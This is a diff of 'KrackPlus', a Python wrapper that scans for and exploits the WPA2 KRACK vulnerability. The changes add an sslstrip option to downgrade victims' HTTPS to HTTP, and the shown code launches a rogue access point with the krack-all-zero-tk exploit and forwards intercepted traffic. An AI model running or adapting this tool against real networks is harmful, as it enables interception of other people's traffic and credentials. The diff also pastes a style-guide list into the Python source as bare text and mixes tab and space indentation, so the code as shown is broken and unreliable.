@@ -36,6 +36,16 @@ log.addHandler(stream)
 #log.error("Serious stuff, this is red for a reason")                 RED
 #log.critical("OH NO everything is on fire")                          SUPER RED/ORANGE
 
+
+I  Members must use four spaces rather than tab
+II  Comments must be in English
+III  CONST must be all capital letters
+IV  Spaces between operator signs:  A + B rather than A+B
+V  Comments must be on the line above
+VI  When introducing only air, only use one page-shift
+VII  Between functions, two page-shifts
+VIII  Between classes and functions, three page-shifts
+
 log.debug("KrackPlus is a tool to scan for and exploit the KRACK vulnerability in WPA2(CVE-2017-13077 & CVE-2017-13080), discovered by Mathy Vanhoef.")
 log.debug("KrackPlus 1.0 by Lars Magnus Trinborgholen, Fredrik Walloe and Lars Kristian Maehlum.\n")
 
@@ -60,19 +70,18 @@ def main():
                         "channel of the target AP. Should be your secondary NIC, i.e USB NIC.", dest='mon')
     parser.add_option('--nic-rogue-ap', help="This option is used to specify Wireless monitor interface that will run a rogue AP"
                         "using a modified hostapd.", dest='rogue')
-    parser.add_option('--pcap', help="Save packet capture to file as a pcap. Provide a filename; $NIC.pcap will be appended to the name. Not compatible with --dd", dest='pcap') 
+    parser.add_option('--pcap', help="Save packet capture to file as a pcap. Provide a filename; $NIC.pcap will be appended to the name. Not compatible with --dd", dest='pcap')
+    parser.add_option('--sslstrip', help="Use this option to enable sslstrip in an attempt to downgrade HTTPS to HTTP.", action='store_true')
 
     # General KRACK+ options:
     parser.add_option('--restore', '-r', help="This option will restore internet connection (wifi). Hopefully you'll never have to use this option.", dest='restore', default=False, action='store_true')
     parser.add_option('-d', help="This option will increase output verbosity for KRACK+ Scan or Attack", dest='debug', action='store_true')
     parser.add_option('--dd', help="This option will increase output verbosity even more for KRACK+ Scan or Attack (debugging purposes). Can be combined with -d", dest='dd', action='store_true')
-
     
     options, args = parser.parse_args()
     
     ############# SCAN ################
     if options.scan and not options.attack:
-
         # Write the credentials to file, so that they can be used next time the progran runs.
         with open('./networkCredentials.txt', 'w') as netCredentials:
             if len(options.password) >= 8:
@@ -150,30 +159,32 @@ def main():
 				if str(".pcap") in str(fileName):
 					shutil.move(fileName, destination)
 
+                elif options.sslstrip:
+                    subprocess.Popen(["sslstrip -w sslstrip.log &"], shell=True)
+
 		else: 
 			subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py " + options.rogue + " " +
                                  options.mon + " " + options.targetSSID + " --target " + options.target + " &"], stdout=attackOutput, shell=True)
-
+                
                 subprocess.Popen(["cd krackattacks-poc-zerokey/krackattack/ && bash enable_internet_forwarding.sh > /dev/null &"], shell=True)
-                subprocess.Popen(["sslstrip -w sslstrip.log &"], shell=True)
-	
-		print("Open Wireshark to see traffic")
+                
+		log.info("Open Wireshark to see traffic")
 		# User will only see relevant output, unless debug is on
 		if options.debug:
-			print("Debug enabled")
+			log.info("Debug enabled")
 		else:            	
 			attackParser()
 
         except KeyboardInterrupt, e:
    	    subprocess.call(["clear"], shell=True)
-	    print e
+	    log.error(e)
             log.info("Cleaning up and restoring wifi ...")
 	    subprocess.call(["rm attackOutput.txt"], shell=True)
             subprocess.call(["./restoreClientWifi.sh"])
 
 	except:
 	    subprocess.call(["clear"], shell=True)
-            log.info("Error occurred. Restoring wifi ...")
+            log.error("Error occurred. Restoring wifi ...")
             subprocess.call(["rm attackOutput.txt"], shell=True)
             subprocess.call(["./restoreClientWifi.sh"])
 
@@ -187,6 +198,7 @@ def main():
     elif options.attack and options.scan:
         log.warn("Scan and attack cannot be run simultaneously. Please specify either [-a] or [-s].")
         parser.print_help()
+        
     else:
         log.warn("No option was given or there were missing arguments, please see usage below and try again!")
         parser.print_help()
